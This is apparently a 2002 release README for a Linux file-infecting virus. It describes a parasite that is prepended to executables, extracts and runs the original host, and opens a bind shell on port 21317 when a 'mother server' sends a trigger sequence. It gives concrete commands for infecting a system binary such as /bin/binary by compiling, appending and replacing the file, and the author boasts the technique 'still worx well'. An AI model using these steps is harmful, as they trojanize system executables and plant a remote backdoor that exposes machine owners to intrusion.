the appendage infection tekneeq works like that:

  _________________
 |                 | The Parasite Code is first, thats why
 | [PARASITE CODE] | it needs to know its own size.
 |_________________|
 |                 | the host code stays untouched and gets
 | [ORIGINAL CODE] | extracted and executed from the virus.
 |_________________| 


two executables are appended together.if the infected 
binary gets executed, it will start its payload and extracts
the host code to a temp file so it can run it.

The payload inside this parasite opens a port shell on the
infected machine if it could connect to the mother server
and recive the right sequence.

* Infection                                              *
**********************************************************

compile the code, then get the file size and change 
the define in the code, now recompile and the parasite 
is ready. to infect a binary, you need to append it 
to the parasite.

example:
         lets say you want to infect /bin/binary -

         gcc parasite.c -O2 -o para  /* compile */ 
         cat /bin/binary >> para     /* append  */
         mv para /bin/binary         /* replace */

**********************************************************
* Additional Information                                 *
**********************************************************

The portshell will be listening on port 21317 by default
and if its in use bind to other random ports.

- Public Release 11.2002 .. coded 01.2002.
  This was released because it leaked and its nothing 
  special anyway .. a old tekneeq that still worx well ;) 
  maybe i release some real ELF infector to the public
  but if so without payload hehehe...
